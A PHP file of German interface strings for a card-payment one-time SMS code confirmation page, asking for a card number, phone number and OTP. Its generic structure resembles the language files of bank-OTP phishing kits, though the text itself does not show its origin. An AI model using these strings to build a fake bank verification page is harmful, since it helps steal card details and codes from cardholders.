<?php
// German translations
$lang = array(
    "title" => "Bestätigung mit Einmalcode",
    "p1" => "Ein einmaliger Code wurde an Ihr Mobiltelefon gesendet.",
    "p2" => "Sie sollten es innerhalb von zwei Minuten erhalten. Geben Sie den unten stehenden Code ein und drücken Sie Bestätigen.",
    "p3" => "Wenn Sie den Einmalcode nicht erhalten, können Sie auf ,Neuer Code“ klicken, um einen neuen zu erhalten.",
    "p4" => "Kartennummer:",
    "p5" => "Handynummer",
    "p6" => "Einmalcode per SMS:",
    "sms" => "Neue SMS wurde gesendet bitte warten!",
    "bc" => "Bestätigen",
    "br" => "Neuer Code",
    "ft" => "Wenn Sie Probleme beim Empfang eines Einmalcodes haben, wenden Sie sich bitte an Ihre Bank.",
    "p8" => "Betrag",


);
?>